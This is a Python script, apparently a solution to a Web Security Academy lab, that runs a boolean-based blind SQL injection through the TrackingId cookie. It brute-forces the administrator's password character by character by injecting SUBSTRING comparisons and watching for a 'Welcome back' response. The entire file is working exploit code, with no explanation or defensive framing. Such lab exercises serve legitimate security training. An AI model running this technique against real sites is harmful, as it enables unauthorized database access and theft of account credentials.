
import requests
import string

url = "https://0aa800390356c69a81192a3400ff0081.web-security-academy.net/"

cookies = {
    "TrackingId": "",
    "session": "qNjx9lqTI5lB9OxHpR01AlYCbJ6lLCcu"
}

charset = string.ascii_letters + string.digits
password = ""

for position in range(1, 50):
    found = False
    for char in charset:
        payload = (
            "4SFi9ggJqvVzA4BM' AND " f"(SELECT SUBSTRING(password,{position},1) " f"FROM users WHERE username='administrator')='{char}'-- -"
        )
        cookies["TrackingId"] = payload
        response = requests.get(
            url,
            cookies=cookies,
            timeout=10
        )
        if "Welcome back" in response.text:
            password += char
            print(f"Position {position}: {char}")
            print(f"Password: {password}")
            found = True
            break
    if not found:
        break

print("\nFinal password:", password)
